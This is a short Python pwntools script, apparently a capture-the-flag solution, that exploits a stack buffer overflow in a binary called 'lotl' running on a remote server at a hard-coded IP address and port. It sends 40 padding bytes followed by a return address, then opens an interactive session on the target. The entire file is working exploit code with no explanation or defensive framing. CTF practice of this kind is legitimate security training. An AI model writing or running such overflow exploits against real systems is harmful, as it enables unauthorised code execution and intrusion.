from pwn import *

# conn = process("./lotl")
conn = remote("46.101.107.117", 2102)

conn.recvuntil(b'> ')

string = b"A"*40 + b"\x6e\x08\x40\x00\x00\x00\x00\x00"

conn.send(string)
conn.interactive()
